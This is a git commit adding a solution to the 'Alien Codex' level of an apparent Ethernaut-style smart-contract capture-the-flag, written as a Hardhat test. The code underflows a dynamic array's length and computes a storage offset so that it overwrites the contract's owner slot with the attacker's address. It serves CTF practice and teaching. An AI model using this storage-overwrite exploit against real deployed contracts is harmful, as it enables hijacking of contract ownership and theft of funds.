c55ab8b15b2bbccb3217dd9680efb60974ab36a0
0xToshii <94262432+0xToshii@users.noreply.github.com>
2022-08-20 18:46:58 -0700

    alien codex

--- test/19-alien-codex.ts
+++ test/19-alien-codex.ts
@@ -2,6 +2,7 @@ import { expect } from "chai";
 import { BigNumber, Contract, Signer } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
+const BN = BigNumber;
 
 let accounts: Signer[];
 let eoa: Signer;
@@ -20,6 +21,17 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  let startIndex = ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001") // getting address of start of array in storage - notice this is in slot 1!
+  let zeroIndex = BN.from(2).pow(256) // zero index w/ overflow
+  let diff = zeroIndex.sub(startIndex) // required for overflow to index zero
+
+  let newOwner = "0x"+"0".repeat(24)+(await eoa.getAddress()).substring(2,42)
+
+  await challenge.connect(eoa).make_contact()
+  await challenge.connect(eoa).retract()
+  await challenge.connect(eoa).revise(diff,newOwner)
+
 });
 
 after(async () => {
